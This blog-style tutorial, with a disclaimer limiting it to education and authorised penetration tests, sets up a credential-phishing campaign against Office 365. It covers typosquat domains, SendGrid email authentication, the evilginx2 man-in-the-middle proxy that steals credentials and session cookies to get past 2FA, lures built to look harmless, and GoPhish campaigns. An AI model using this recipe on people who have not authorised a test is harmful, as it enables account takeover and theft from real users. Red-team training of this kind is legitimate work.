
# Gone Phishing

Disclaimer

*All information in this blog post is only for educational purposes or legitimate penetration testing assignments with written permissions.*

## Introduction

Phishing is categorized as social engineering and is used to steal login credentials. If done right phishing can even bypass 2FA and therefore can be very dangerous. Today's trip will be all about Email phishing and spear phishing with the right tools and the best bait!

### Risky business

The impact of successful phishing attacks on a business can be devastating. From loss of money and intellectual property to damage of the company's reputation and disruption of day to day work.

### What to bring on your phishing trip

* Domain name used for phishing.
* Internet facing virtual private server
* A MITM proxy which can capture credentials (evilginx2)
* Phishing framework for email templates and phishing campaigns.(GoPhish)
* SMPT server (sendgrid)  

### Hop skip jump

We will go step by step trough the process of setting up a phishing campaign. The first step would be to find a domain name that will be used for phishing. You can find  cheap available domains all over the internet. Its best to find a domain name that is as similar as possible of the legitimate website. [dnstwister](https://dnstwister.report) can help you find typosquat domains.(picture dnstwister?--)
for demo purposes we will use **doomed.be** as reference.
next important step is domain authentication, this is to improve the legitimacy of our sended emails and will increase the deliverability of our phishing emails. in this demo we will use sendgrid free account and change everything accordingly. follow the instructions below.

go to the settings and search sender or domain authentication
Fill in your own preferences (e.g GoDaddy)

![ ](DNShost%20.png)

Fill in your  domain and select custom link subdomain and DKIM selector. To fully understand the changes made here check this [link](https://docs.sendgrid.com/ui/account-and-settings/how-to-set-up-domain-authentication#-Using-a-custom-DKIM).

![ ](Screenshot%202022-10-04%20at%2012.43.48.png)

DNS records are instructions in authoritative DNS servers which are providing information about a domain including what IP address is associated with that domain and how to handle requests for that domain. These records consist of a series of text files written in what is known as DNS syntax. We will add several types of DNS records, including CNAME, MX and TXT records. In order for the SMPT service to be allowed to send on behalf of our domain, we need to make some changed to our DNS settings.

Go to domain registrar's site (e.g GoDaddy) and configure DNS settings to include the generated records.
Check [this](https://www.cloudflare.com/en-gb/learning/dns/dns-records/) link for a explanation of DNS records
![ ](Screenshot%202022-10-04%20at%2012.44.09.png)
It will depend on your DNS host how you need to configure your records just be sure to select the right type to your host and value's, double check if your own hostname is getting auto-filled or not because this can often lead to misconfigurations as seen below:
![ ](sendgrid%20wrong%20.png)
Meanwhile while we are in the configuration panel of our DNS host we can also link the IP address of our VPS to our domain which we will need later when setting up our proxy (evilginx2).
![ ](Arecords.png)

### Evilgophish setup

The tools we use for our phishing campaigns are evilginx2 and gophish.
Evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
To install evilginx2 go to https://github.com/kgretzky/evilginx2/releases and copy the link behind the precompiled package e.g (evilginx-linux-amd64.tar.gz)
![ ](copylinkevilginx2.png)
Go to your VPS trough ssh and past the link behind the **wget** command : 
```wget https://github.com/kgretzky/evilginx2/releases/download/<newst.version>/evilginx-linux-amd64.tar.gz```

Now extract the file accordantly, for tar.gz files you should:
```tar -xf <filename>```
to start the engine:
```chmod 700 ./evilginx2```
```sudo ./evilginx2```
![ ](evilginx%20start.png)
If something goes wrong please check [here](https://github.com/kgretzky/evilginx2) for further instructions.
For the demo we will concentrate on Office 365.
now we need to edit the config file to add our domain,IP and redirect url.
The redirect url will redirect will mislead unintended users.
```config domain <yourdomain>```
```config ip <yourip>```
```config redirect_url https://www.youtube.com/watch?v=dQw4w9WgXcQ```
To check just type ```config```
![ ](configcheck.png)
Now we need to set up TLS certification for our domain. all the work here will be done by the tool, we only need to configure our domain for the "phishlet" we want to use:
```phishlets hostname o365 <yourdomain>```
```phishlets enable o365```

![ ](phisletsenable.png)
If for some reason the tool does not give you: successfully set up SSL/TLS certificates for domains then double check your DNS configuration at your control panel of your domain host.

Next we need to set up the lure, the actual phishing link we are sending to our victims
```lures create o365```
```lures get-url 1```
![ ](lurescreate.png)
Now we need add the redirect url to the page they will see after logging in. In this case we will use the official log in page of office to lower the suspicion of the phished user. also we can change the URL path of the phishing link to reduce suspicion if the user inspects the link.
```lures edit 0 redirect_url https://login.microsoftonline.com```
```lures edit 0 path securelink```
![ ](redirectlures.png)
At the time of writing this the standard phishlet for office365 did not work, if you want to update the o365 phishlet here are the steps.

Go to the directory where evilginx2 is located.
```~/evilginx2 ls```
``` cd phishlets```
``` vim o365.yaml ```
now you should be in the yaml file that holds the phishlet data.
To delete the content easly hold ```shift + :``` to be able to type then type ```%d``` and press enter. normally the file should be empty now.
Now go to this [link](https://gist.github.com/hazcod/887dc2bbc3eb90ac9fd7788867b23416) and copy the code.
 Go back to your terminal and paste the code in the o365.yaml file and then again press ```shift + :``` and type ```wq``` followed by ```enter```.
Start your evilginx2 up again and lets test our our phishing link.

once in evilginx2 type
```lures get-url 0```
Copy the link and paste it in your browser.
![ ](linktophish.png)
To make sure that evilginx2 stays up and running after disconnecting you SSH connection we can put the evilginx2 session in [tmux](https://www.hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/).
To start up a new tmux session just type
```tmux``` in your terminal and the session wil open.
![ ](tmux1.png)
Its best to split the tmux session in two so that you can multitask in your session without shutting down evilginx2.
To do this press ```ctrl``` + ```B``` and then press ```%```
you need to type % so if on your keyboard it is e.g shift + 5 then hold shift and % after the ctrl + B combination.
![ ](tmux2.png)
To switch between sides press ```ctrl``` + ```B``` and then press ```o```.
now start evilginx2 in one side.

To detach your current session use ```ctrl``` + ```B``` and then press ```d```.

Now that your session is detached you can pick it up from where you left it at any later point in time. To re-attach to a session you need to figure out which session you want to attach to first. Figure out which sessions are running by using

```tmux ls```
This will give you a list of all running sessions, which in our example should be something like

0: 1 windows (created Wed Oct  5 13:50:39 2022) (detached)
To connect to that session you start tmux again but this time tell it which session to attach to:

```tmux attach -t 0```
Note that the -t 0 is the parameter that tells tmux which session to attach to. “0” is the first part of your tmux ls output.

### Gophish setup
To install gophish we can use the same way as with evilginx.
Lets go fetch the [link](https://github.com/gophish/gophish/releases) that fits our OS architecture and download the zip file with wget on our VPS.
![ ](copylink.png)
In your VPS terminal
```wget <link.to.zip>```
``` unzip gophish-v0.12.1-linux-64bit.zip```
You can run the gophish app in the same tmux version as your evilginx2. earlier we made a second screen inside the tmux version so lets go there (```tmux attach 0 -t```) go to the directory of gophish.
should have a binary called gophish in this directory. there should be a file called config.json. Here, change the listen_url from 127.0.0.1:3333 to 0.0.0.0:3333.
now to start gophish enter app we need to make it executable, to do this enter ```chmod +x gophish``` in your terminal.
now enter ```./gophish``` to start up the tool. your login credentials will be printed in the logs.
![ ](gophishcreds.png)
#### Setting up your email template and landing page

You can set up an email template in gophish via the administrator panel ```https://[your-ip]:3333```. Navigate to Email templates and press new template.
To make your landing page in gophish you need to make it redirect to your evilginx2 phishing link. add this code to the html in the landing page setup en switch the link with your generated link.
![ ](landingpagegoph.png)
For the sending profile we need to configure it so that we send mails from the sendgrid account. After we created a sender profile on sendgrid we need to get an api key to insert in our gophish campaign.you cna find this in the left pane when logged in to your sendgrid account.
![ ](APIkey.png)
After saving the apikey go to your gophish sending profile and fill it in the password box, and apikey as username:
![ ](sendingacc.png)
Try sending the test email, if this work you can start your campaigns!
